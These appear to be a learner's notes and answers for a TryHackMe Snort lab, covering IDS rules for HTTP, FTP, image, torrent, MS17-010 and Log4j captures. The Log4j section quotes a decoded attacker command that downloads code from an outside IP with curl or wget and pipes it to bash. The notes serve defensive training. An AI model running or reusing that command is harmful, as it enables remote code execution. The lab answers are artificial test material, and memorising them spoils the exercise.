#Snort #Networking #NetworkSecurity 
https://tryhackme.com/room/snortchallenges1

- https://medium.com/@huglertomgaw/snort-challenge-the-basics-tryhackme-225c332b50ac 
- https://www.youtube.com/watch?v=0Ac-1Djv14s
- https://en.wikipedia.org/wiki/List_of_file_signatures
- 
## writing IDS rules HTTP

Navigate to the task folder and use the given pcap file.  

```
/var/log/snort                    default location of the log file
/etc/snort/snort.conf   
/etc/snort/rules/local.rules

#-----  commands used in room

# investigate the pcap file
sudo snort -A full -r mx-3.pcap -c local.rules -l .

# read the dumped log
sudo snort -r , snort.log.file 

sudo nano local.rules           # editing text editor, nano  
cat alert                       # reading alert file  
sudo rm alert                   # deleting the alert file  
sudo rm <snort.log.file>        # deleting the log file

```

> [!info] Note: You must answer this question correctly before answering the rest of the questions.

Write a rule to detect all TCP packets from or to port 80.
```
What is the number of detected packets you got?

sudo snort -A full -r mx-3.pcap -c local.rules -l .

Breakdown by protocol (includes rebuilt packets):
        Eth:          460 (100.000%)
       VLAN:            0 (  0.000%)
        IP4:          444 ( 96.522%)
       Frag:            0 (  0.000%)
       ICMP:          272 ( 59.130%)
        UDP:            8 (  1.739%)
        TCP:          164 ( 35.652%)

164
```

```
alert tcp any 80 <> any any (msg:"TCP port 80 inbound traffic detected";sid:1000000000001; rev :1)  
alert tcp any any <> any 80 (msg:"TCP port 80 outbound traffic detected";sid:1000000000002; rev :1)
```

What is the destination address of packet 63?
```
sudo snort -A full -r mx-3.pcap -c local.rules -l .
sudo snort -r snort.log.<tab> -n 63

216.239.59.99

sudo snort -r snort.log.1741294091 | grep -E -o '[0-9]{3}\.[0-9]{3}\.[0-9]{2}\.[0-9]{2}' >> match.txt

```

```
What is the ACK number of packet 64?

sudo snort -r snort.log.<tab> -n64

0x2E6B5384

What is the SEQ number of packet 62?

0x36C21E28

What is the TTL of packet 65?
128

What is the source IP of packet 65?
145.254.160.237

What is the source port of packet 65?
3372
```

## writing IDS rules (FTP) 

Write a **single** rule to detect "**all TCP port 21**"  traffic in the given pcap.

```
# causes issue for me

alert tcp any 21 <> any any  (msg: "ICMP packet from "; sid: 100000001; rev:1;)
alert tcp any any <> any 21  (msg: "ICMP packet from "; sid: 100000002; rev:1;)
```

```
What is the number of detected packets?

sudo snort -c local.rules -l . -A full -r ftp-png-gif.pcap 

307

What is the FTP service name?

sudo snort -r snort.log.<tab> -X -n 10
Microsoft FTP Service

Deactivate/comment on the old rules.
Write a rule to detect failed FTP login attempts in the given pcap.  

What is the number of detected packets?

local.rules
alert tcp any any <> any 21 (msg:"failed logins "; content:"530 User"; sid: 100000001; rev:1;)

41

Deactivate/comment on the old rule.  
Write a rule to detect successful FTP logins in the given pcap.  

What is the number of detected packets?

local.rules
alert tcp any any <> any 21 (msg:"failed logins "; content:"230 User"; sid: 100000001; rev:1;)

alerts: 1

Deactivate/comment on the old rule.  
Write a rule to detect FTP login attempts with a valid username but no password entered yet.  

What is the number of detected packets?

local.rules
alert tcp any any <> any 21 (msg:"login attempts "; content:"331 Password"; sid: 100000001; rev:1;)

alerts: 42

Deactivate/comment on the old rule.  
Write a rule to detect FTP login attempts with the "Administrator" username but no password entered yet.  

What is the number of detected packets?

local.rules
alert tcp any any <> any 21 (msg:"login attempts "; content:"331 Password"; content: "Administrator"; sid: 100000001; rev:1;)

alerts: 7

```

## writing IDS rules (PNG)

```
Use the given pcap file.  
Write a rule to detect the PNG file in the given pcap.  

Investigate the logs and identify the software name embedded in the packet.

need the bytes of a PNG file

local.rules
alert tcp any any <> any any (msg:"packet found"; content: "|89 50 4E 47 0D 0A 1A 0A|"; sid: 100000001; rev:1;)

sudo snort -c local.rules -l . -A full -r ftp-png-gif.pcap 

sudo snort -r snort.log.<tab> -X

Adobe ImageReady

Deactivate/comment on the old rule.  
Write a rule to detect the GIF file in the given pcap.

Investigate the logs and identify the image format embedded in the packet. Check for the MIME type/Magic Number.

local.rules
alert tcp any any <> any any (msg:"packet found"; content: "GIF89a"; sid: 100000001; rev:1;)

GIF89a
```

## writing IDS rules (torrent metafile)

```
Use the given pcap file.  

Write a rule to detect the torrent metafile in the given pcap.
What is the number of detected packets?

local.rules
alert tcp any any <> any any (msg:"packet found"; content: "torrent"; sid: 100000001; rev:1;)

sudo snort -c local.rules -l . -A full -r torrent.pcap 

alert: 2

Investigate the log/alarm files.  
What is the name of the torrent application?

sudo snort -r snort.log.1741457263 -X

Accept: application/x-bittorrent
bittorrent

Investigate the log/alarm files.
What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?

Accept: application/x-bittorrent

Investigate the log/alarm files.  
What is the hostname of the torrent metafile?

tracker2.torrentbox.com

```

## troubleshoot rule syntax 

In this section, you need to fix the syntax errors in the given rule files. 
You can test each ruleset with the following command structure;

```
sudo snort -c local-X.rules -r mx-1.pcap -A console
```

```
Fix the syntax error in local-1.rules file and make it work smoothly.  
What is the number of the detected packets? (space matters)

alert tcp any 3372 -> any any (msg: "Troubleshooting 1"; sid:1000001; rev:1;)

sudo snort -c local-1.rules -r mx-1.pcap -A console

alerts: 16

Fix the syntax error in local-2.rules file and make it work smoothly.  
What is the number of the detected packets?

alert icmp any any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)

sudo snort -c local-2.rules -r mx-1.pcap -A console

alerts: 68

Fix the syntax error in local-3.rules file and make it work smoothly.  
What is the number of the detected packets?

alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)

sudo snort -c local-3.rules -r mx-1.pcap -A console

alerts: 87

Fix the syntax error in local-4.rules file and make it work smoothly.  
What is the number of the detected packets?

alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)

sudo snort -c local-4.rules -r mx-1.pcap -A console

alerts: 90

Fix the syntax error in local-5.rules file and make it work smoothly.  
What is the number of the detected packets?

alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert icmp any any <> any any (msg: "Inbound ICMP Packet Found"; sid:1000002; rev:1;)
alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; rev:1;)

alerts: 155

Fix the logical error in local-6.rules file and make it work smoothly to create alerts.  
What is the number of the detected packets?

alert tcp any any <> any 80  (msg: "GET Request Found"; content:"|67 65 74|"; nocase; sid: 100001; rev:1;)

alerts: 2

Fix the logical error in local-7.rules file and make it work smoothly to create alerts.  
What is the [ name ] of the required option:

alert tcp any any <> any 80  (msg: "hello!"; content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)

msg

```

## using external rules (MS17-010)

```
Use the given rule file (local.rules) to investigate the ms1710 exploitation.

What is the number of detected packets?

sudo snort -c local.rules -r ms-17-010.pcap 
alerts: 25154

Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.

What is the number of detected packets?

alert tcp any any <> any any  (msg: "payload"; content:"\\IPC$"; sid: 100001; rev:1;)

sudo snort -c local-1.rules -r ms-17-010.pcap -l .
alerts: 12

Investigate the log/alarm files.  
What is the requested path? Ends with "\IPC$"

sudo snort -r snort.log.1741460186 -X

\\192.168.116.138\IPC

What is the CVSS v2 score of the MS17-010 vulnerability?

https://nvd.nist.gov/vuln/detail/cve-2017-0144
9.3

```

## using external rules (Log4j)

```
Use the given rule file (local.rules) to investigate the log4j exploitation.

What is the number of detected packets?

sudo snort -A full -c local.rules -l . -r log4j.pcap
alerts: 26

How many rules were triggered?
events: 4

What are the first six digits of the triggered rule sids?
sig-id=21003728 
210037 

Use local-1.rules empty file to write a new rule to detect packet payloads **between 770 and 855 bytes**. The "dsize" option will help you to filter the payload size.
What is the number of detected packets?

alert tcp any any <> any any  (msg: "payload"; dsize:770<>855; sid: 100001; rev:1;)

sudo snort -A full -l . -c local-1.rules -r log4j.pcap

alerts: 41

Investigate the log/alarm files.  
What is the name of the used encoding algorithm?

sudo snort -r snort.log.1741461191 -X
base64

What is the IP ID of the corresponding packet?

62808

Decode the encoded command. You can use the "base64" tool. Read the log/alarm files and extract the bas64 command. base64 --decode filename.txt
What is the attacker's command?

KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=

(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash

What is the CVSS v2 score of the Log4j vulnerability?

9.3

```

